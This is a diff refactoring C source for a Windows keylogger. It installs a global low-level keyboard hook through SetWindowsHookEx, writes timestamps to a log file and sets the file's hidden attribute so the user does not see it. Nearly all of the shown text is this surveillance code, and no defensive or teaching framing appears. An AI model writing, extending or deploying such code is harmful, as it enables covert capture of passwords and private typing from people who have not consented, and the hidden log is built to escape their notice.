@@ -69,35 +69,41 @@ LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam)
 	return CallNextHookEx(hook, nCode, wparam, lparam);
 }
 
-// Sets the keylogging hook
-int setupHook()
+int setKeylogHook()
 {
 	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeylogProc, GetModuleHandle(NULL), 0);
 	return hook == NULL;
 }
 
-// Removes the keylogging hook
-int removeHook()
+int removeKeylogHook()
 {
 	int unhook_status = UnhookWindowsHookEx(hook);
 	hook = NULL;
 	return unhook_status;
 }
 
-// Opens log file for appending, inserts timestamp, and hides the file
-void initLogFile()
+void hideLogFile()
+{
+    DWORD attributes = GetFileAttributes("log");
+    SetFileAttributes("log", attributes + FILE_ATTRIBUTE_HIDDEN);
+}
+
+void writeTimestampToLogFile()
 {
     FILE *f;
     f = fopen("log", "a+");
 
     time_t t = time(NULL);
     struct tm tm = *localtime(&t);
-    fprintf(f, "\n\nCurrent Time: %d-%d-%d %d:%d:%d\n", tm.tm_year + 1900, tm.tm_mon + 1,tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
-
-    DWORD attributes = GetFileAttributes("log");
-    SetFileAttributes("log", attributes + FILE_ATTRIBUTE_HIDDEN);
+    fprintf(f, "\n\nCurrent Time: %d-%d-%d %d:%d:%d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
 
     fclose(f);
+}
+
+void initLogFile()
+{
+    writeTimestampToLogFile();
+    hideLogFile();
 }
 
 int main()
@@ -108,10 +114,10 @@ int main()
     // Initializes log file
     initLogFile();
     
-    // Sets up the keylogging hook
-    if (setupHook() != 0)
+    // Error handling for keylog hook creation
+    if (setKeylogHook() != 0)
     {
-        printf("Error setting hook.\n\n");
+        printf("Error setting keylog hook.\n\n");
         return -1;
     }
     
@@ -123,10 +129,10 @@ int main()
         DispatchMessage(&msg);
     }
     
-    // Removes the keylogging hook
-    if (removeHook() != 0)
+    // Error handling for keylog hook removal
+    if (removeKeylogHook() != 0)
     {
-        printf("Error removing hook.\n\n");
+        printf("Error removing keylog hook.\n\n");
         return -1;
     }
 
